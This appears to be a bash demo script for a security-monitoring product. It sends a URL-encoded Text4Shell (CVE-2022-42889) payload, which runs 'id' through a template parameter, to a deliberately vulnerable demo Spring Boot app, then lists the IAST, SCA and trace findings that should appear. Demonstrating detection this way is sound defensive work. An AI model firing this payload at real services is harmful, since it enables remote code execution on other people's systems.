#!/usr/bin/env bash
# Demo: Text4Shell (CVE-2022-42889) via template parameter
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/_common.sh"

banner "Text4Shell" \
       "corndog-menu (Java/Spring Boot)" \
       "IAST + SCA (Vulnerability Management)" \
       "CVE-2022-42889"

ENCODED_PAYLOAD='%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29%7D'

run_curl "Sending Text4Shell payload via template parameter" \
  "${BASE_URL}/api/menu/1/formatted?template=${ENCODED_PAYLOAD}"

dd_signal \
  "Security > Application Security > Vulnerabilities — IAST finding linked to CVE-2022-42889" \
  "Security > Application Security > Vulnerability Management — SCA finding for commons-text:1.9" \
  "APM > Traces — trace on corndog-menu showing tainted data flow through StringSubstitutor"
